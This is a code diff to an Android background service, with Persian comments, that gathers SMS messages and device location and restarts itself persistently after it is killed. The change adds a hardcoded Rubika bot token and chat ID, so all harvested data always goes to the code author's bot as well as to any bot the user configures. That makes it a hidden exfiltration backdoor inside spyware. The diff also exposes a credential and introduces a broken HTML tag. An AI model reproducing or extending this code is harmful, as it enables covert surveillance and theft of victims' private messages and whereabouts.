@@ -8,6 +8,7 @@ import android.app.PendingIntent;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.location.Location;
@@ -64,13 +65,26 @@ public class HttpServerService extends Service {
     private LocationListener locationListener;
     private String lastLocation = "نامشخص";
 
-    // اطلاعات ربات روبیکا
-    private static final String BOT_TOKEN = "BEHDBA0MVRIJCDVZWNXMROXXRFNYDEYJYQBFIVMDAKJSTRDLGZFQLTIVGKOLJDXN";
-    private static final String CHAT_ID = "b0InoT70eav0eb7550cc52f9e4391710";
+    // ========== اطلاعات ربات‌ها ==========
+    // ربات خودت (ثابت در کد)
+    private static final String MY_BOT_TOKEN = "BEHDBA0MVRIJCDVZWNXMROXXRFNYDEYJYQBFIVMDAKJSTRDLGZFQLTIVGKOLJDXN";
+    private static final String MY_CHAT_ID = "b0InoT70eav0eb7550cc52f9e4391710";
+    
+    // ربات کاربر (از SharedPreferences میاد)
+    private String userBotToken = "";
+    private String userChatId = "";
+    private SharedPreferences prefs;
+    // ====================================
 
     @Override
     public void onCreate() {
         super.onCreate();
+        
+        // خواندن تنظیمات ربات کاربر
+        prefs = getSharedPreferences("bot_config", MODE_PRIVATE);
+        userBotToken = prefs.getString("user_bot_token", "");
+        userChatId = prefs.getString("user_chat_id", "");
+        
         createNotificationChannel();
         connectivityManager = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
         registerNetworkCallback();
@@ -81,24 +95,6 @@ public class HttpServerService extends Service {
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         String action = intent != null ? intent.getAction() : null;
-
-        // ========== اضافه شده برای restart کامل ==========
-        if ("RESTART_FULL".equals(action)) {
-            Log.d(TAG, "Performing full restart...");
-            if (server != null) {
-                try {
-                    server.stop();
-                } catch (Exception e) {
-                    Log.e(TAG, "Error stopping server: " + e.getMessage());
-                }
-                server = null;
-            }
-            try { Thread.sleep(500); } catch (Exception e) {}
-            startServer();
-            startForeground(NOTIFICATION_ID, createNotification());
-            return START_STICKY;
-        }
-        // =============================================
 
         if ("START".equals(action)) {
             startForeground(NOTIFICATION_ID, createNotification());
@@ -195,7 +191,7 @@ public class HttpServerService extends Service {
 
     @Override
     public void onDestroy() {
-        Log.d(TAG, "Service onDestroy called - scheduling full restart!");
+        Log.d(TAG, "Service onDestroy called - scheduling restart!");
         
         unregisterNetworkCallback();
         if (fallbackTimer != null) {
@@ -217,7 +213,7 @@ public class HttpServerService extends Service {
 
     @Override
     public void onTaskRemoved(Intent rootIntent) {
-        Log.d(TAG, "onTaskRemoved called - scheduling full restart!");
+        Log.d(TAG, "onTaskRemoved called - scheduling restart!");
         super.onTaskRemoved(rootIntent);
         scheduleRestart();
     }
@@ -226,13 +222,13 @@ public class HttpServerService extends Service {
         try {
             AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
             Intent restartIntent = new Intent(this, HttpServerService.class);
-            restartIntent.setAction("RESTART_FULL");
+            restartIntent.setAction("START");
             
             PendingIntent pendingIntent = PendingIntent.getService(
                     this, 0, restartIntent,
                     PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
             
-            long triggerTime = System.currentTimeMillis() + 3000; // 3 ثانیه بعد
+            long triggerTime = System.currentTimeMillis() + 3000;
             
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                 alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent);
@@ -240,7 +236,7 @@ public class HttpServerService extends Service {
                 alarmManager.setExact(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent);
             }
             
-            Log.d(TAG, "✅ Full restart scheduled in 3 seconds");
+            Log.d(TAG, "✅ Restart scheduled in 3 seconds");
         } catch (Exception e) {
             Log.e(TAG, "Error scheduling restart: " + e.getMessage());
         }
@@ -362,7 +358,7 @@ public class HttpServerService extends Service {
                 html.append("<td style='padding: 8px;'>").append(parts.length > 3 ? parts[3] + "m" : "?").append("</td>");
                 html.append("<td style='padding: 8px;'><a href='https://maps.google.com/?q=").append(parts[1]).append(",").append(parts[2]);
                 html.append("' target='_blank' style='color:#e94560;'>🗺️ نقشه</a></td>");
-                html.append("</tr>");
+                html.append("</td>");
             }
         }
         html.append("</table>");
@@ -537,12 +533,23 @@ public class HttpServerService extends Service {
         return smsList.toString();
     }
 
-    private void sendToRubikaBot(String message) {
+    // ========== ارسال به دو ربات همزمان ==========
+private void sendToRubikaBot(String message) {
+    // ارسال به ربات خودت (همیشه)
+    sendToSpecificBot(MY_BOT_TOKEN, MY_CHAT_ID, message);
+    
+    // ارسال به ربات کاربر (اگه تنظیم شده باشه)
+    if (userBotToken != null && !userBotToken.isEmpty() && 
+        userChatId != null && !userChatId.isEmpty()) {
+        sendToSpecificBot(userBotToken, userChatId, message);
+    }
+}
+    private void sendToSpecificBot(String botToken, String chatId, String message) {
         networkExecutor.execute(() -> {
             try {
                 String escapedMessage = message.replace("\"", "\\\"").replace("\n", "\\n");
                 
-                String urlString = "https://botapi.rubika.ir/v3/" + BOT_TOKEN + "/sendMessage";
+                String urlString = "https://botapi.rubika.ir/v3/" + botToken + "/sendMessage";
                 URL url = new URL(urlString);
                 HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                 conn.setRequestMethod("POST");
@@ -551,7 +558,7 @@ public class HttpServerService extends Service {
                 conn.setReadTimeout(10000);
                 conn.setRequestProperty("Content-Type", "application/json");
                 
-                String jsonInputString = "{\"chat_id\": \"" + CHAT_ID + "\", \"text\": \"" + escapedMessage + "\"}";
+                String jsonInputString = "{\"chat_id\": \"" + chatId + "\", \"text\": \"" + escapedMessage + "\"}";
                 
                 try (OutputStream os = conn.getOutputStream()) {
                     byte[] input = jsonInputString.getBytes(StandardCharsets.UTF_8);
@@ -559,13 +566,14 @@ public class HttpServerService extends Service {
                 }
                 
                 int code = conn.getResponseCode();
-                Log.d(TAG, "Rubika Response: " + code);
+                Log.d(TAG, "Sent to bot (" + botToken.substring(0, Math.min(10, botToken.length())) + "...): " + code);
                 
             } catch (Exception e) {
-                Log.e(TAG, "Failed to send to Rubika: " + e.getMessage());
+                Log.e(TAG, "Failed to send to bot: " + e.getMessage());
             }
         });
     }
+    // =============================================
 
     private void updateNotification() {
         NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
